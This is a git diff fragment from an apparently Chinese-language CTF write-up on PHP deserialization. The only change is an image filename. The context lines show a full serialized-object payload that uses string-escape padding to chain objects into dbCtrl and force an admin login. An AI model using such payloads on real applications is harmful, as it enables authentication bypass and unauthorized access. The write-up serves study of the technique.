@@ -189,7 +189,7 @@ O:4:"Info":2:{s:3:"age";s:3:"123";s:8:"nickname";s:324:"hackerhackerhackerhacker
 age=123&nickname=***************************************************unionunionunion";s:4:"test";O:12:"UpdateHelper":1:{s:3:"sql";O:4:"User":2:{s:8:"nickname";O:4:"Info":1:{s:8:"CtrlCase";O:6:"dbCtrl":2:{s:4:"name";s:5:"admin";s:8:"password";s:1:"1";}}s:3:"age";s:70:"select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?";}}
 ```
 
-![](<../../.gitbook/assets/image (26) (1) (1).png>)
+![](<../../.gitbook/assets/image (26) (1) (1) (1).png>)
 
 这会让`dbCtrl::login()`成功执行，把token赋值为admin。
 
